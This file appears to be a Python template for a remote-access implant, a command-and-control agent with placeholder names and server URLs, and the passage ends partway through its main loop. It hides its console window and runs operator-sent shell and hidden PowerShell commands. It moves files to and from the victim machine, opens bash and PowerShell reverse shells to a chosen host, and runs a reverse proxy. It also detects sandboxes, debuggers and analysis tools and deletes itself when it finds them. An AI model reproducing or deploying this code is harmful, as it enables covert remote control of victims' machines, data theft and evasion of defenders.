#!/usr/bin/env python3
import ctypes
import ctypes.wintypes
import struct
import sys
import base64
import os
import platform
import subprocess
import time
import random
import socket
import uuid
import json
import threading
import shutil
import requests
import urllib3
from cryptography.fernet import Fernet

try:
    import platform
    if platform.system().lower() == 'windows':
        try:
            import ctypes
            try:
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass
            try:
                GWL_EX_STYLE = -20
                WS_EX_TOOLWINDOW = 0x00000080
                hwnd = ctypes.windll.kernel32.GetConsoleWindow()
                if hwnd:
                    ex_style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_EX_STYLE)
                    ex_style |= WS_EX_TOOLWINDOW
                    ctypes.windll.user32.SetWindowLongW(hwnd, GWL_EX_STYLE, ex_style)
                    ctypes.windll.user32.ShowWindow(hwnd, 0)
                    ctypes.windll.user32.UpdateWindow(hwnd)
            except:
                pass
        except:
            pass
except:
    pass

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

{dead_code_1}

class {class_name}:
    def {m_init}(self):
        try:
            import platform
            if platform.system().lower() == 'windows':
                try:
                    import ctypes
                    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
                except:
                    pass
        except:
            pass
        
        self.{v_c2} = "{c2_url}"
        self.{v_agent_id} = "{agent_id}"
        self.{v_headers} = {headers}
        self.{v_heartbeat} = {heartbeat}
        self.{v_jitter} = {jitter}
        self.{v_register_uri} = {register_uri_code}
        self.{v_tasks_uri} = {tasks_uri_code}
        self.{v_results_uri} = {results_uri_code}
        self.{v_interactive_uri} = {interactive_uri_code}
        self.{v_interactive_status_uri} = {interactive_status_uri_code}
        self.{v_running} = False
        self.{v_interactive_mode} = False
        self.{v_interactive_thread} = None
        self.{v_interactive_polling} = False
        self.{v_current_interactive_task} = None
        self.{v_hostname} = socket.gethostname()
        self.{v_username} = os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
        self.{v_os_info} = platform.system() + " " + platform.release()

        self.{v_secret_key} = None  # Will be set during registration
        self.{v_fernet} = None     # Fernet instance for encryption/decryption

        # P2P functionality has been removed

        self.{v_sandbox_enabled} = {sandbox_check_enabled}

        # Redirector configuration
        self.{v_redirector_host} = "{redirector_host}"
        self.{v_redirector_port} = {redirector_port}
        self.{v_use_redirector} = {use_redirector}

        # Failover configuration
        self.{v_use_failover} = {use_failover}
        self.{v_failover_urls} = {failover_urls}
        self.{v_current_c2_url} = "{c2_url}"
        self.{v_current_fail_count} = 0
        self.{v_max_fail_count} = 15  # Try main C2 for ~15 * heartbeat_interval before failover

        # Flag to prevent failover recursion
        self.{v_in_failover_attempt} = False

        # Working hours and kill date configurations
        self.{v_kill_date} = "{kill_date}"
        self.{v_working_hours} = {{
            'start_hour': {working_hours_start_hour},
            'end_hour': {working_hours_end_hour},
            'timezone': "{working_hours_timezone}",
            'days': {working_hours_days}
        }}

        # Reverse proxy variables
        self.{v_reverse_proxy_active} = False
        self.{v_reverse_proxy_stop_event} = threading.Event()
        self.{v_reverse_proxy_thread} = None

        {dead_code_2}

    def {m_encrypt_data}(self, data):
        if not self.{v_fernet}:
            return data  # Return as-is if no encryption available yet
        
        try:
            import json
            if not isinstance(data, str):
                data = json.dumps(data)
            encrypted = self.{v_fernet}.encrypt(data.encode())
            return base64.b64encode(encrypted).decode()
        except Exception as e:
            import traceback
            return data

    def {m_decrypt_data}(self, encrypted_data):
        """Decrypt data using the secret key"""
        if not self.{v_fernet}:
            return encrypted_data  # Return as-is if no decryption available yet
        
        try:
            import json
            encrypted_bytes = base64.b64decode(encrypted_data.encode())
            decrypted = self.{v_fernet}.decrypt(encrypted_bytes)
            decrypted_str = decrypted.decode()
            try:
                return json.loads(decrypted_str)
            except:
                return decrypted_str
        except Exception as e:
            import traceback
            return encrypted_data

    def {m_send}(self, method, uri_template, data=None):
        uri = uri_template.format(agent_id=self.{v_agent_id})

        # Use redirector if enabled
        if self.{v_use_redirector}:
            protocol = "https" if self.{v_current_c2_url}.startswith("https") else "http"
            url = protocol + "://" + self.{v_redirector_host} + ":" + str(self.{v_redirector_port}) + uri
        else:
            url = self.{v_current_c2_url} + uri

        try:
            if method.upper() == 'GET':
                response = requests.get(url, headers=self.{v_headers}, timeout=30, verify=False)
            elif method.upper() == 'POST':
                response = requests.post(url, json=data, headers=self.{v_headers}, timeout=30, verify=False)
            else:
                return None

            if response.status_code == 200:
                try:
                    return response.json()
                except:
                    return None
            else:
                return None

        except requests.exceptions.RequestException:
            return None
        except Exception:
            return None

    def {m_try_failover}(self):
        if not self.{v_use_failover} or not self.{v_failover_urls}:
            return False

        # Check if we should try failover based on failure count
        if self.{v_current_fail_count} < self.{v_max_fail_count}:
            return False

        # Set flag to indicate we're in a failover attempt to prevent recursion
        self.{v_in_failover_attempt} = True

        # Try to register with a failover C2
        for failover_url in self.{v_failover_urls}:
            original_c2_url = self.{v_current_c2_url}
            self.{v_current_c2_url} = failover_url

            # Try to register with the failover server
            try:
                if self.{m_register}():
                    # Successfully connected to failover C2
                    self.{v_current_fail_count} = 0  # Reset failure count
                    self.{v_in_failover_attempt} = False  # Reset the flag
                    return True
            except Exception as e:
                pass

        self.{v_current_c2_url} = original_c2_url
        self.{v_in_failover_attempt} = False  # Reset the flag
        return False

    def {m_increment_fail_count}(self):
        self.{v_current_fail_count} += 1

        if self.{v_current_fail_count} >= self.{v_max_fail_count} and not self.{v_in_failover_attempt}:
            self.{m_try_failover}()

    def {m_reset_fail_count}(self):
        self.{v_current_fail_count} = 0

    def {m_register}(self):
        if self.{v_sandbox_enabled}:
            if self.{m_check_sandbox}():
                self.{m_self_delete}()
                return False
                
            if self.{m_check_debuggers}():
                self.{m_self_delete}()
                return False
                
            if self.{m_check_network_tools}():
                self.{m_self_delete}()
                return False
            
        data = {{
            'agent_id': self.{v_agent_id},
            'hostname': self.{v_hostname},
            'os_info': self.{v_os_info},
            'user': self.{v_username},
            'listener_id': '{listener_id_for_registration}',
            'interactive_capable': True,
            'secret_key': self.{v_secret_key}  # Send embedded secret key to prove identity
        }}
        response_data = self.{m_send}('POST', self.{v_register_uri}, data)
        if response_data and response_data.get('status') == 'success':
            if 'checkin_interval' in response_data:
                self.{v_heartbeat} = response_data['checkin_interval']
            if 'jitter' in response_data:
                self.{v_jitter} = response_data['jitter']
            
            if 'secret_key' in response_data and not self.{v_fernet}:
                try:
                    from cryptography.fernet import Fernet
                    self.{v_secret_key} = response_data['secret_key']
                    self.{v_fernet} = Fernet(self.{v_secret_key}.encode())
                except:
                    pass
            elif self.{v_secret_key} and not self.{v_fernet}:
                try:
                    from cryptography.fernet import Fernet
                    self.{v_fernet} = Fernet(self.{v_secret_key}.encode())
                except:
                    pass
            # Reset failure count on successful registration
            self.{m_reset_fail_count}()
            return True
        else:
            # to prevent recursion during failover attempts
            if not self.{v_in_failover_attempt}:
                self.{m_increment_fail_count}()
            return False

    def {m_get_tasks}(self):
        response_data = self.{m_send}('GET', self.{v_tasks_uri})
        if response_data and response_data.get('status') == 'success':
            tasks = response_data.get('tasks', [])
            for task in tasks:
                if 'command' in task and self.{v_fernet}:
                    task['command'] = self.{m_decrypt_data}(task['command'])
            # Reset failure count on successful communication
            self.{m_reset_fail_count}()
            return tasks
        else:
            # Increment failure count if communication failed
            self.{m_increment_fail_count}()
            return None  # Return None to indicate failure

    def {m_check_interactive_status}(self):
        response_data = self.{m_send}('GET', self.{v_interactive_status_uri})
        if response_data and response_data.get('status') == 'success':
            return response_data.get('interactive_mode', False)
        return False

    def {m_get_interactive_command}(self):
        response_data = self.{m_send}('GET', self.{v_interactive_uri})

        if response_data and response_data.get('status') == 'success':
            if response_data.get('interactive_mode') and response_data.get('command'):
                # Decrypt the command if encryption is available
                command = response_data['command']
                if hasattr(self, '{v_fernet}') and self.{v_fernet}:
                    try:
                        decrypted_command = self.{m_decrypt_data}(command)
                        command = decrypted_command
                    except Exception as e:
                        # If decryption fails, use the original command
                        pass

                return {{
                    'command': command,
                    'task_id': response_data.get('task_id'),
                    'interactive_mode': True
                }}

        return None

    def {m_submit_interactive_result}(self, task_id, result):
        # Encrypt the result if encryption is available
        encrypted_result = result
        if hasattr(self, '{v_fernet}') and self.{v_fernet}:
            try:
                encrypted_result = self.{m_encrypt_data}(result)
            except Exception as e:
                # If encryption fails, use the original result
                pass

        data = {{'task_id': task_id, 'result': encrypted_result}}
        response_data = self.{m_send}('POST', self.{v_interactive_uri}, data)
        success = response_data is not None and response_data.get('status') == 'success'
        return success

    def {m_exec}(self, command):
        try:
            command_lower = command.lower().strip()
            is_powershell = False
            
            if any(powershell_cmd in command_lower for powershell_cmd in ['powershell', 'pwsh', 'powershell.exe']):
                is_powershell = True
            else:
                powershell_patterns = [
                    '$', 'get-', 'set-', 'new-', 'remove-', 'invoke-', 
                    'select-', 'where-', 'foreach-', 'out-', 'export-',
                    'import-', 'write-', 'read-', 'clear-', 'update-',
                    '|', 'get-wmiobject', 'get-ciminstance', 'start-process',
                    'get-service', 'stop-service', 'restart-service', 'set-service'
                ]
                pattern_count = sum(1 for pattern in powershell_patterns if pattern in command_lower)
                is_powershell = pattern_count >= 2 or any(pattern in command_lower for pattern in ['get-wmiobject', 'get-ciminstance', 'start-process', 'powershell -', 'ps -'])

            if is_powershell:
                if len(command) > 8000:  # Approaching Windows command line limit
                    try:
                        if platform.system().lower() == 'windows':
                            startupinfo = subprocess.STARTUPINFO()
                            try:
                                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                                startupinfo.wShowWindow = subprocess.SW_HIDE
                            except AttributeError:
                                startupinfo = None
                            
                            try:
                                process = subprocess.Popen(
                                    ['pwsh', '-WindowStyle', 'Hidden', '-Command', '-'],  # Read from stdin with hidden window
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE,
                                    startupinfo=startupinfo
                                )
                            except FileNotFoundError:
                                process = subprocess.Popen(
                                    ['powershell', '-WindowStyle', 'Hidden', '-Command', '-'],  # Read from stdin with hidden window
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE,
                                    startupinfo=startupinfo
                                )
                        else:
                            try:
                                process = subprocess.Popen(
                                    ['pwsh', '-Command', '-'],  # Read from stdin
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE
                                )
                            except FileNotFoundError:
                                return "[ERROR] PowerShell not available on this system"
                        
                        stdout, stderr = process.communicate(input=command.encode(), timeout=30)
                        output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
                        return output if output else "[Large PowerShell command executed successfully - no output]"
                    except subprocess.TimeoutExpired:
                        if 'process' in locals():
                            process.kill()
                        return "[ERROR] Large PowerShell command timed out after 30 seconds"
                    except Exception as e:
                        return f"[ERROR] Large PowerShell command execution failed: {{str(e)}}"
                else:
                    try:
                        if platform.system().lower() == 'windows':
                            startupinfo = subprocess.STARTUPINFO()
                            try:
                                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                                startupinfo.wShowWindow = subprocess.SW_HIDE
                            except AttributeError:
                                startupinfo = None
                            
                            try:
                                process = subprocess.Popen(
                                    ['pwsh', '-WindowStyle', 'Hidden', '-Command', command],
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE,
                                    startupinfo=startupinfo
                                )
                            except FileNotFoundError:
                                process = subprocess.Popen(
                                    ['powershell', '-WindowStyle', 'Hidden', '-Command', command],
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE,
                                    startupinfo=startupinfo
                                )
                        else:
                            try:
                                process = subprocess.Popen(
                                    ['pwsh', '-Command', command],
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE
                                )
                            except FileNotFoundError:
                                return "[ERROR] PowerShell not available on this system"
                        
                        stdout, stderr = process.communicate(timeout=30)
                        output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
                        return output if output else "[PowerShell command executed successfully - no output]"
                    except subprocess.TimeoutExpired:
                        process.kill()
                        return "[ERROR] PowerShell command timed out after 30 seconds"
                    except Exception as e:
                        return f"[ERROR] PowerShell command execution failed: {{str(e)}}"
            else:
                process = subprocess.Popen(
                    command,
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, 
                    stdin=subprocess.PIPE,
                    shell=True
                )
                
                stdout, stderr = process.communicate(timeout=30)
                output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
                return output if output else "[Command executed successfully - no output]"
            
        except subprocess.TimeoutExpired:
            process.kill()
            return "[ERROR] Command timed out after 30 seconds"
        except Exception as e:
            return f"[ERROR] Command execution failed: {{str(e)}}"

    def {m_submit}(self, task_id, result):
        if self.{v_fernet}:
            encrypted_result = self.{m_encrypt_data}(result)
            data = {{'task_id': task_id, 'result': encrypted_result}}
        else:
            data = {{'task_id': task_id, 'result': result}}
        response = self.{m_send}('POST', self.{v_results_uri}, data)

        # Check if the submission was successful
        if response and response.get('status') == 'success':
            return True
        else:
            return False

    def {m_check_sandbox}(self):
        try:
            import multiprocessing
            cpu_count = multiprocessing.cpu_count()
            if cpu_count < 2:
                return True
        except:
            pass
            
        try:
            import psutil
            total_ram = psutil.virtual_memory().total / (1024**3)  # in GB
            if total_ram < 2:  # Less than 2GB is suspicious
                return True
        except ImportError:
            try:
                ram_output = subprocess.check_output(['cat', '/proc/meminfo']).decode('utf-8', errors='ignore')
                mem_total_line = [line for line in ram_output.split('\n') if 'MemTotal' in line]
                if mem_total_line:
                    mem_kb = int(mem_total_line[0].split()[1]) / 1024 / 1024  # Convert to GB
                    if mem_kb < 2:
                        return True
            except:
                pass
        
        try:
            total_disk, _, _ = shutil.disk_usage('/')
            total_gb = total_disk / (1024**3)
            if total_gb < 50:  # Less than 50GB is suspicious
                return True
        except:
            try:
                disk_output = subprocess.check_output(['df', '-h', '/']).decode('utf-8', errors='ignore')
                lines = disk_output.strip().split('\n')
                if len(lines) > 1:
                    parts = lines[1].split()
                    if len(parts) > 1:
                        size_str = parts[1]
                        if size_str.endswith('G'):
                            size_val = float(size_str[:-1])
                            if size_val < 50:
                                return True
            except:
                pass
        
        try:
            hostname = socket.gethostname().lower()
            sandbox_indicators = [
                'sandbox', 'malware', 'detected', 'test', 
                'cuckoo', 'sandbox', 'malbox', 'innotek', 
                'virtual', 'vmware', 'vbox', 'xen'
            ]
            for indicator in sandbox_indicators:
                if indicator in hostname:
                    return True
        except:
            pass
        
        try:
            username = os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
            if username.lower() in ['sandbox', 'malware', 'user', 'test', 'admin']:
                return True
        except:
            pass
        
        try:
            mac = hex(uuid.getnode())
            virtual_mac_prefixes = ['080027', '000c29', '005056', '001c42', '525400']
            for prefix in virtual_mac_prefixes:
                if mac.startswith(prefix):
                    return True
        except:
            pass
        
        try:
            processes = subprocess.check_output(['ps', 'aux']).decode('utf-8', errors='ignore')
            sandbox_processes = [
                'cape', 'fakenet', 'wireshark', 'tcpdump', 'ollydbg',
                'x32dbg', 'x64dbg', 'ida', 'gdb', 'devenv', 'procmon',
                'procexp', 'sniff', 'netmon', 'apimonitor', 'regmon',
                'filemon', 'immunity', 'windbg', 'fiddler'
            ]
            for proc in sandbox_processes:
                if proc.lower() in processes.lower():
                    return True
        except:
            try:
                processes = subprocess.check_output(['tasklist']).decode('utf-8', errors='ignore')
                sandbox_processes = [
                    'cape', 'fakenet', 'wireshark', 'tcpdump', 'ollydbg',
                    'x32dbg', 'x64dbg', 'ida', 'gdb', 'devenv', 'procmon',
                    'procexp', 'sniff', 'netmon', 'apimonitor', 'regmon',
                    'filemon', 'immunity', 'windbg', 'fiddler', 'apimon',
                    'regmon', 'filemon'
                ]
                for proc in sandbox_processes:
                    if proc.lower() in processes.lower():
                        return True
            except:
                pass
        
        try:
            suspicious_paths = [
                '/vmware/', '/virtualbox/', '/vbox/', 
                'sandbox', 'cuckoo', 'cape', 'malware'
            ]
            current_path = os.getcwd().lower()
            for path in suspicious_paths:
                if path in current_path:
                    return True
        except:
            pass
        
        try:
            env_vars = os.environ
            sandbox_envs = [
                'SANDBOX', 'CUCKOO', 'CAPE', 'MALWARE',
                'VIRUSTOTAL', 'HYBRID', 'ANYRUN'
            ]
            for var in sandbox_envs:
                if var in env_vars or var.lower() in env_vars:
                    return True
        except:
            pass
        
        try:
            with open('/proc/uptime', 'r') as f:
                uptime_seconds = float(f.read().split()[0])
                if uptime_seconds < 300:  # Less than 5 minutes
                    return True
        except:
            try:
                import psutil
                boot_time = psutil.boot_time()
                current_time = time.time()
                uptime = current_time - boot_time
                if uptime < 300:  # Less than 5 minutes
                    return True
            except:
                pass
        
        try:
            suspicious_files = [
                'C:\\\\windows\\\\temp\\\\vmware_trace.log',  # VMware
                'C:\\\\windows\\\\temp\\\\VirtualBox.log',   # VirtualBox
                'C:\\\\windows\\\\system32\\\\drivers\\\\VBoxMouse.sys',  # VBox
                '/tmp/vmware_trace.log',  # VMware on Linux
                '/tmp/vbox_mouse.log',    # VBox on Linux
            ]
            for file_path in suspicious_files:
                if os.path.exists(file_path):
                    return True
        except:
            pass
        
        if platform.system().lower() == 'windows':
            try:
                import winreg
                sandbox_keys = [
                    (winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\\\VMware, Inc.\\\\VMware Tools'),
                    (winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\\\Oracle\\\\VirtualBox Guest Additions'),
                    (winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\\\\CurrentControlSet\\\\Enum\\\\IDE'),
                ]
                for hkey, subkey in sandbox_keys:
                    try:
                        key = winreg.OpenKey(hkey, subkey)
                        winreg.CloseKey(key)
                        return True
                    except:
                        continue
            except:
                pass
        
        try:
            hardware_info = subprocess.check_output(['lshw', '-short'], stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
            if 'virtualbox' in hardware_info.lower() or 'vmware' in hardware_info.lower():
                return True
        except:
            pass
            
        try:
            hypervisor_check = subprocess.check_output(['systemd-detect-virt']).decode('utf-8', errors='ignore').strip()
            if hypervisor_check not in ['none', '']:
                return True
        except:
            pass
            
        return False

    def {m_check_debuggers}(self):
        try:
            parent_pid = os.getppid()
            parent_process = subprocess.check_output(['ps', '-p', str(parent_pid), '-o', 'comm=']).decode('utf-8', errors='ignore').strip()
            debugger_parent = ['gdb', 'gdbserver', 'ollydbg', 'x32dbg', 'x64dbg', 'ida', 'windbg', 'immunity']
            for dbg in debugger_parent:
                if dbg in parent_process.lower():
                    return True
        except:
            try:
                import psutil
                current_process = psutil.Process(os.getpid())
                parent_process = current_process.parent()
                if parent_process:
                    parent_name = parent_process.name().lower()
                    debugger_parent = ['gdb', 'gdbserver', 'ollydbg', 'x32dbg', 'x64dbg', 'ida', 'windbg', 'immunity']
                    for dbg in debugger_parent:
                        if dbg in parent_name:
                            return True
            except:
                pass

        try:
            tracer = subprocess.check_output(['cat', f'/proc/{{os.getpid()}}/status'], stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
            lines = tracer.split('\n')
            for line in lines:
                if line.startswith('TracerPid:'):
                    tracer_pid = line.split(':')[1].strip()
                    if tracer_pid != '0':
                        return True
        except:
            try:
                is_debugged = ctypes.windll.kernel32.IsDebuggerPresent()
                if is_debugged:
                    return True
            except:
                pass

        try:
            processes = subprocess.check_output(['ps', 'aux']).decode('utf-8', errors='ignore')
            debugger_processes = [
                'gdb', 'gdbserver', 'ollydbg', 'x32dbg', 'x64dbg', 'ida', 'windbg',
                'immunity', 'devenv', 'vsdebug', 'msvsmon', 'apimonitor', 'regmon', 'filemon'
            ]
            for dbg in debugger_processes:
                if dbg in processes.lower():
                    return True
        except:
            try:
                processes = subprocess.check_output(['tasklist']).decode('utf-8', errors='ignore')
                debugger_processes = [
                    'gdb', 'gdbserver', 'ollydbg', 'x32dbg', 'x64dbg', 'ida', 'windbg',
                    'immunity', 'devenv', 'vsdebug', 'msvsmon', 'apimonitor', 'regmon', 'filemon'
                ]
                for dbg in debugger_processes:
                    if dbg.lower() in processes.lower():
                        return True
            except:
                pass

        try:
            import time
            start = time.time()
            time.sleep(0.01)  # Sleep for 10ms
            actual_sleep = time.time() - start
            if actual_sleep < 0.005 or actual_sleep > 0.02:  # Allow some variance
                return True
        except:
            pass

        return False

    def {m_check_network_tools}(self):
        try:
            processes = subprocess.check_output(['ps', 'aux']).decode('utf-8', errors='ignore')
            network_tools = [
                'wireshark', 'tcpdump', 'tshark', 'netsniff', 'ettercap', 'burp', 'mitmproxy',
                'fiddler', 'charles', 'netcat', 'ncat', 'socat', 'nmap', 'zmap', 'masscan',
                'theharvester', 'maltego', 'nessus', 'openvas', 'nessusd', 'snort', 'suricata'
            ]
            for tool in network_tools:
                if tool.lower() in processes.lower():
                    return True
        except:
            try:
                processes = subprocess.check_output(['tasklist']).decode('utf-8', errors='ignore')
                network_tools = [
                    'wireshark', 'tcpdump', 'tshark', 'netsniff', 'ettercap', 'burp', 'mitmproxy',
                    'fiddler', 'charles', 'netcat', 'ncat', 'socat', 'nmap', 'zmap', 'masscan',
                    'theharvester', 'maltego', 'nessus', 'openvas', 'nessusd', 'snort', 'suricata',
                    'netstat', 'procmon', 'procexp'
                ]
                for tool in network_tools:
                    if tool.lower() in processes.lower():
                        return True
            except:
                pass

        try:
            username = os.getenv('USERNAME', '')
            cert_paths = [
                '/etc/ssl/certs/burp.crt', 
                os.path.expanduser('~/.burp/cert.crt'),
                'C:\\\\Program Files\\\\Burp Suite\\\\cert.crt',
                'C:\\\\Users\\\\' + username + '\\\\AppData\\\\Roaming\\\\Burp Suite\\\\cert.crt'
            ]
            for path in cert_paths:
                if os.path.exists(path):
                    return True
        except:
            pass

        try:
            netstat_output = subprocess.check_output(['netstat', '-an']).decode('utf-8', errors='ignore')
            suspicious_ports = ['8080', '8081', '8090', '9000', '9001', '9090', '10000']
            for port in suspicious_ports:
                if ':' + port in netstat_output:
                    return True
        except:
            pass

        return False

    def {m_check_working_hours}(self):
        import datetime

        now = datetime.datetime.now()
        if self.{v_working_hours}['timezone'] == 'UTC':
            # Use UTC time - avoid deprecated utcnow()
            now = datetime.datetime.now(datetime.timezone.utc)

        # Check if current day is in the allowed working days
        # Python's weekday: 0=Monday, 1=Tuesday, 2=Wednesday, etc. (6=Sunday)
        current_weekday = now.weekday() + 1  # Convert to 1-7 (Monday=1, Sunday=7)

        if current_weekday not in self.{v_working_hours}['days']:
            return False

        # Check if current hour is within working hours
        current_hour = now.hour
        start_hour = self.{v_working_hours}['start_hour']
        end_hour = self.{v_working_hours}['end_hour']

        # Handle the case where working hours cross midnight (e.g. 22:00 to 04:00)
        if start_hour <= end_hour:
            # Normal case (e.g. 9:00 to 17:00)
            return start_hour <= current_hour < end_hour
        else:
            # Hours cross midnight (e.g. 22:00 to 04:00)
            return current_hour >= start_hour or current_hour < end_hour

    def {m_check_kill_date}(self):
        import datetime

        try:
            # Parse the kill date (expected format: "YYYY-MM-DDTHH:MM:SSZ" like "2025-12-31T23:59:59Z")
            kill_datetime = datetime.datetime.strptime(self.{v_kill_date}, "%Y-%m-%dT%H:%M:%SZ")
            kill_datetime = kill_datetime.replace(tzinfo=datetime.timezone.utc)

            current_datetime = datetime.datetime.now(datetime.timezone.utc)
            return current_datetime > kill_datetime
        except:
            # If we can't parse the kill date, assume no kill date (return False to not kill)
            return False

    def {m_self_delete}(self):
        try:
            import atexit
            import sys
            script_path = os.path.abspath(sys.argv[0])
            if os.path.exists(script_path):
                os.remove(script_path)
        except:
            pass
        finally:
            # Force exit
            os._exit(0)

    








    def {m_handle_upload}(self, command):
        try:
            parts = command.split(' ', 2)
            if len(parts) != 3:
                return "[ERROR] Invalid upload command format."
            
            remote_path, encoded_data = parts[1], parts[2]
            
            decoded_data = base64.b64decode(encoded_data)
            
            with open(remote_path, 'wb') as f:
                f.write(decoded_data)
                
            return f"[SUCCESS] File uploaded to {{remote_path}}"
        except Exception as e:
            return f"[ERROR] File upload failed: {{str(e)}}"

    def {m_handle_download}(self, command):
        try:
            parts = command.split(' ', 1)
            if len(parts) != 2:
                return "[ERROR] Invalid download command format."
            
            remote_path = parts[1]
            
            if not os.path.exists(remote_path):
                return f"[ERROR] File not found on remote machine: {{remote_path}}"
                
            with open(remote_path, 'rb') as f:
                file_content = f.read()
            
            encoded_content = base64.b64encode(file_content).decode('utf-8')
            return encoded_content
            
        except Exception as e:
            return f"[ERROR] File download failed: {{str(e)}}"

    def {m_handle_direct_shell}(self, command):
        try:
            # Command format: "tty_shell <host> <port>" 
            import subprocess
            import os
            import platform
            
            parts = command.split()
            if len(parts) >= 3:
                host = parts[1]
                port = int(parts[2])
            else:
                host = '127.0.0.1'
                port = 5000

            system_os = platform.system().lower()
            
            if system_os == 'windows':
                ps_cmd_start = "$client = New-Object System.Net.Sockets.TCPClient('"
                ps_cmd_middle = "', "
                ps_cmd_end = ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1|Out-String );$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendback2.Length);$stream.Flush()}};$client.Close()"
                powershell_cmd = ps_cmd_start + host + ps_cmd_middle + str(port) + ps_cmd_end
                reverse_shell_cmd = "powershell -c \\\\\\\" " + powershell_cmd + " \\\\\\\" &"
            else:
                reverse_shell_cmd = "bash -c 'exec bash -i >& /dev/tcp/" + host + "/" + str(port) + " 0>&1' &"
            
            subprocess.Popen(reverse_shell_cmd, shell=True)
            
            return "[SUCCESS] Direct shell connection established in background process"
        except Exception as e:
            return f"[ERROR] Direct shell connection failed: {{str(e)}}"

    def {m_start_interactive_polling}(self):
        if self.{v_interactive_polling}:
            return
            
        self.{v_interactive_polling} = True
        self.{v_interactive_thread} = threading.Thread(target=self.{m_interactive_poll_worker}, daemon=True)
        self.{v_interactive_thread}.start()

    def {m_stop_interactive_polling}(self):
        self.{v_interactive_polling} = False
        if self.{v_interactive_thread} and self.{v_interactive_thread}.is_alive():
            self.{v_interactive_thread}.join(timeout=5)

    def {m_interactive_poll_worker}(self):
        while self.{v_interactive_polling} and self.{v_running}:
            try:
                interactive_data = self.{m_get_interactive_command}()
                
                if interactive_data and interactive_data.get('command'):
                    command = interactive_data['command']
                    task_id = interactive_data['task_id']
                    if command.startswith('pwsh '):
                        try:
                            encoded_script = command[5:]  # Remove "pwsh " prefix
                            decoded_script = base64.b64decode(encoded_script).decode('utf-8')
                            result = self.{m_exec}(decoded_script)
                        except Exception as e:
                            result = f"[ERROR] Failed to decode and execute pwsh: {{str(e)}}"
                    elif command.startswith('sleep '):
                        try:
                            parts = command.split(' ', 1)
                            if len(parts) == 2:
                                new_sleep = int(parts[1])
                                if new_sleep > 0:
                                    self.{v_heartbeat} = new_sleep
                                    result = f"[SUCCESS] Sleep interval changed to {{new_sleep}} seconds"
                                else:
                                    result = "[ERROR] Sleep interval must be a positive integer"
                            else:
                                result = "[ERROR] Invalid sleep command format. Usage: sleep <seconds>"
                        except ValueError:
                            result = "[ERROR] Sleep interval must be a valid integer"
                        except Exception as e:
                            result = f"[ERROR] Failed to change sleep interval: {{str(e)}}"
                    elif command == 'reverse_proxy_start':
                        # Start reverse proxy in a separate thread
                        proxy_thread = threading.Thread(target=self.{m_start_reverse_proxy}, daemon=True)
                        proxy_thread.start()
                        result = "[SUCCESS] Reverse proxy started."
                    elif command == 'reverse_proxy_stop':
                        self.{m_stop_reverse_proxy}()
                        result = "[SUCCESS] Reverse proxy stopped."
                    else:
                        result = self.{m_exec}(command)
                    self.{m_submit_interactive_result}(task_id, result)
                
                time.sleep(2)
                
            except Exception:
                time.sleep(5)

    def {m_enter_interactive_mode}(self):
        if self.{v_interactive_mode}: return True
        self.{v_interactive_mode} = True
        self.{m_start_interactive_polling}()
        return True

    def {m_exit_interactive_mode}(self):
        if not self.{v_interactive_mode}: return True
        self.{v_interactive_mode} = False
        self.{m_stop_interactive_polling}()
        return True

    def {m_run}(self):
        """Main agent loop with interactive mode and file transfer support"""
        
        # Windows stealth: Ensure window remains hidden during execution
        try:
            import platform
            if platform.system().lower() == 'windows':
                try:
                    import ctypes
                    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
                except:
                    pass
        except:
            pass
        
        while not self.{m_register}():
            time.sleep(30)
            
        # P2P functionality has been removed
        
        self.{v_running} = True
        check_count = 0
        
        while self.{v_running}:
            try:
                # Check kill date first
                if self.{m_check_kill_date}():
                    self.{m_self_delete}()
                    return

                try:
                    import platform
                    if platform.system().lower() == 'windows':
                        try:
                            import ctypes
                            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
                        except:
                            pass
                except:
                    pass

                # Check if we're outside working hours
                if not self.{m_check_working_hours}():
                    # Sleep for 5 minutes and check again
                    time.sleep(5 * 60)
                    continue

                check_count += 1

                if check_count % 3 == 0:
                    should_be_interactive = self.{m_check_interactive_status}()
                    if should_be_interactive and not self.{v_interactive_mode}:
                        self.{m_enter_interactive_mode}()
                    elif not should_be_interactive and self.{v_interactive_mode}:
                        self.{m_exit_interactive_mode}()

                if not self.{v_interactive_mode}:
                    tasks = self.{m_get_tasks}()
                    if tasks is not None:
                        # Reset failure count on successful task fetch
                        self.{m_reset_fail_count}()
